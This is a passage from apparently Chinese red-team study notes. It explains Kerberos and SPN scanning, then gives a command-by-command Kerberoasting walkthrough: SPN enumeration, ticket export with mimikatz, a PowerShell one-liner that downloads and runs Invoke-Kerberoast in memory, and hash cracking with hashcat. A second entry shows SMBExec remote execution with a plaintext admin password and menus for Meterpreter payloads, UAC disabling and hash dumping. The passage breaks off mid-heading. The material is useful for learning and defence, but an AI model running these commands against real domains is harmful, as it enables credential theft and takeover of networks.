        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p><p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p><p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p><p>Kerberos 协议中的名称解释：</p><ul><li>Client: 访问服务的客户端</li><li>Server: 提供服务的服务器</li><li>KDC (Key Distribution Center): 密钥分发中心</li><li>AS (Authentication Service): 认证服务器</li><li>TGS (Ticket Granting Service): 票据授予服务</li><li>DC (Domain Controller): 域控制器</li><li>AD (Account Database): 用户数据库</li><li>TGT (Ticket Granting Ticket): 票证授予票证</li><li>ST (Servre Ticket): 服务票据</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906154732.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>根据上图，这里一步一步进行解释</p><p><strong>第一阶段：Clinet 与 AS</strong></p><p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。</p><p>② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：</p><ul><li>第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息、IP、当前时间戳 </li><li>第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。</li></ul><p>至此，第一阶段通信完成。</p><p><strong>第二阶段：Clinet 与 TGS</strong></p><p>此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳、接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK</p><p>首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。</p><p>③ 客户端向 TGS 发起请求，请求的内容包含三部分：</p><ul><li>第一部分：使用 CT_SK 加密的客户端信息、IP、时间戳</li><li>第二部分：自己想要访问的 Server 服务信息（明文形式）</li><li>第三部分：使用 TGS 密钥加密的 TGT</li></ul><p>④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p><p>​    接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息、CT_SK、时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。</p><p>​    之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。</p><p>​    此时 TGS 将向客户端发起响应，响应信息包含两部分：</p><ul><li>第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息、IP、客户端待访问的服务端信息、ST 有效信息、时间戳以及用于客户端和服务端之间通信的 CS_SK</li><li>第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK 、时间戳和 ST 的有效时间。</li></ul><p>至此，第二阶段通信完成。</p><p><strong>第三阶段：Clinet 与 Server</strong></p><p>此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。</p><p>⑤ 客户端向服务端发送请求，请求内容包括两部分：</p><ul><li>第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息</li><li>第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST</li></ul><p>⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。</p><p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p><p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p><p>这里可以再通过时序图加深下印象。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906174237.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>注意点：</p><ul><li>KDC 服务默认会安装在一个域的域控中</li><li>Kerberos 认证采用对称加密算法</li><li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li><li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li><li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li></ul><h2 id="1、SPN"><a href="#1、SPN" class="headerlink" title="1、SPN"></a>1、SPN</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。</p><p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p><p>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。</p><p>SPN 格式如下：</p><pre class="line-numbers language-none"><code class="language-none">serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>serviceclass（必选）：服务组件名称</p><p>hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)</p><p>port（可选）：以冒号分隔，后面的内容为该服务监听的端口号</p><p>servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</p></blockquote><h3 id="常见-SPN-服务"><a href="#常见-SPN-服务" class="headerlink" title="常见 SPN 服务"></a>常见 SPN 服务</h3><p>MSSQL 服务</p><pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;DBServer.teamssix.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exchange 服务</p><pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RDP 服务</p><pre class="line-numbers language-none"><code class="language-none">TERMSRV&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>WSMan/WinRM/PSRemoting 服务</p><pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SPN-扫描脚本"><a href="#SPN-扫描脚本" class="headerlink" title="SPN 扫描脚本"></a>SPN 扫描脚本</h3><p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p><p>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。</p><p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p><h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">setspn -T teamssix -Q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Active-Directory-模块"><a href="#Active-Directory-模块" class="headerlink" title="Active Directory 模块"></a>Active Directory 模块</h4><p>PowerShell 模块 Active Directory 只在域控上有</p><pre class="line-numbers language-none"><code class="language-none">Import-Module ActiveDirectoryget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Microsoft.ActiveDirectory.Management.dllget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Powershell-AD-Recon"><a href="#Powershell-AD-Recon" class="headerlink" title="Powershell-AD-Recon"></a>Powershell-AD-Recon</h4><p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM</p><p>Powershell-AD-Recon 下载地址：<a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p><p>Powershell-AD-Recon 工具包里的内容如下：</p><pre class="line-numbers language-none"><code class="language-none">Discover-PSInterestingServices# 查找所有 SPN 服务Discover-PSMSExchangeServers# 查找 Exchange 服务器Discover-PSMSSQLServers         # 查找 MSSQL 服务器Find-PSServiceAccounts          # 查找服务账户Get-DomainKerberosPolicy        # 获取域 Kerberos 策略Get-PSADForestInfo              # 获取域森林信息Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>下载后的文件是没有 .ps1 后缀的，需要自己添加上</p></blockquote><p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。</p><p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSMSSQLServers.ps1Discover-PSMSSQLServers或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>扫描域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSInterestingServices.ps1Discover-PSInterestingServices或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。</p><p>kerberoast 下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;GetUserSPNs.ps1或者PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p><pre class="line-numbers language-none"><code class="language-none">cscript.exe GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PowerShellery"><a href="#PowerShellery" class="headerlink" title="PowerShellery"></a>PowerShellery</h4><p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p><p>PowerShellery 下载地址：<a href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search *或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>结果也可以转换为表格的形式，以便于浏览</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search * -List yes或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-DomainSpn.psm1Get-DomainSpn或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>Impacket 下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906144640.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、kerberoast"><a href="#2、kerberoast" class="headerlink" title="2、kerberoast"></a>2、kerberoast</h2><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p><p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p><p>kerberoast 的利用思路：</p><p>1、查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p><p>2、请求并导出 TGS</p><p>3、对 TGS 进行爆破</p><p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p><p>手动注册 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -A MSSQLSvc&#x2F;DBSRV.teamssix.com:1433 test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看用户所对应的 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -L teamssix.com\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p><p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p><p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>请求指定 SPN 的服务票据</p><pre class="line-numbers language-none"><code class="language-none">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DBSRV.teamssix.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者请求所有服务的服务票据</p><pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel  setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p><p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p><pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;EmpireProject&#x2F;Empire&#x2F;6ee7e036607a62b0192daed46d3711afc65c3921&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 Rubeus 获取票据</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 impacket 获取票据</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113159.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p><p>Kerberoast 脚本下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">python tgsrepcrack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113300.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a></p><p><a href="https://y4er.com/post/kerberos-kerberoasting-spn">https://y4er.com/post/kerberos-kerberoasting-spn</a></p><p><a href="https://www.freebuf.com/articles/web/280406.html">https://www.freebuf.com/articles/web/280406.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1170758">https://cloud.tencent.com/developer/article/1170758</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/11707302.html">https://www.cnblogs.com/zpchcbd/p/11707302.html</a></p><p><a href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a></p><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】23、SMBExec 与 DCOM 的使用</title>
      <link href="//210904-110701.html"/>
      <url>//210904-110701.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、SMBExec"><a href="#1、SMBExec" class="headerlink" title="1、SMBExec"></a>1、SMBExec</h2><p>利用 SMBExec 可以通过文件共享（admin$、c$、ipc$、d$）在远程系统中执行命令，它的工作方式类似于 PsExec</p><h3 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h3><p>C++ 版项目地址：<a href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a></p><p>一看这个项目是 8 年前上传的了，然后试了用 VS2019 没编译成功，而且目前各大杀软也都查杀这个工具了，所以这个就不看了，直接看 impacket 里的同类工具。</p><h3 id="impacket-版"><a href="#impacket-版" class="headerlink" title="impacket 版"></a>impacket 版</h3><p>在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。</p><pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902153131.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h3><p>smbexec 工具包下载地址：<a href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p><p>这里安装以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.gitcd smbexec&#x2F;chmod +x install.shsudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装时需要选择操作系统，根据自己情况选择就行，如果是 Kali 就选择 Debain，然后选择安装目录，直接回车默认 /opt 目录即可。</p><p>安装完后，在终端里输入 smbexec 就会显示 smbexec 的主菜单，分别如下：</p><pre class="line-numbers language-none"><code class="language-none">1. System Enumeration   &#x2F;&#x2F; 获取系统信息2. System Exploitation  &#x2F;&#x2F; 执行系统命令3. Obtain Hashes        &#x2F;&#x2F; 获取系统哈希4. Options              &#x2F;&#x2F; 一些其他操作5. Exit                 &#x2F;&#x2F; 退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择菜单 1 System Enumeration 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create a host list                 &#x2F;&#x2F; 扫描目标 IP 段中存活的主机2. Check systems for Domain Admin     &#x2F;&#x2F; 获取目标系统中的管理员3. Check systems for logged in users  &#x2F;&#x2F; 获取当前登录目标系统的用户4. Check systems for UAC              &#x2F;&#x2F; 获取目标系统 UAC 的状态5. Enumerate Shares                   &#x2F;&#x2F; 获取目标系统中的网络共享目录6. File Finder                        &#x2F;&#x2F; 搜索目标系统中的敏感文件7. Remote login validation            &#x2F;&#x2F; 获取目标系统中远程登录的用户8. Main menu                          &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择菜单 2 System Exploitation 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create an executable and rc script    &#x2F;&#x2F; 生成一个 meterpreter Payload 并在目标系统中运行它2. Disable UAC                           &#x2F;&#x2F; 关闭远程主机的 UAC3. Enable UAC                            &#x2F;&#x2F; 开启远程主机的 UAC4. Execute Powershell                    &#x2F;&#x2F; 执行一个 PowerShell 脚本5. Get Shell                             &#x2F;&#x2F; 使用基于 PsExec 的方式获得目标系统的 Shell6. In Memory Meterpreter via Powershell  &#x2F;&#x2F; 通过 PowerShell 在内存中插入 Meterpreter Payload7. Remote system access                  &#x2F;&#x2F; 远程访问系统8. Main menu                             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择菜单 3 Obtain Hashes 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Domain Controller            &#x2F;&#x2F; 获取域控哈希2. Workstation &amp; Server Hashes  &#x2F;&#x2F; 获取本地哈希3. Main menu                    &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>选择菜单 4 Options 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Save State            &#x2F;&#x2F; 保存当前状态2. Load State            &#x2F;&#x2F; 加载以前保存的状态3. Set Thread Count      &#x2F;&#x2F; 设置线程数4. Generate SSL Cert     &#x2F;&#x2F; 生成 SSL 证书5. Enter Stealth Mode    &#x2F;&#x2F; 进入安静模式6. About                 &#x2F;&#x2F; 关于7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取目标系统 UAC 的状态</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163458.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>获取目标系统中的网络共享目录</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163631.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>获取本地哈希</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902161205.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、DCOM-在远程系统中的使用"><a href="#2、DCOM-在远程系统中的使用" class="headerlink" title="2、DCOM 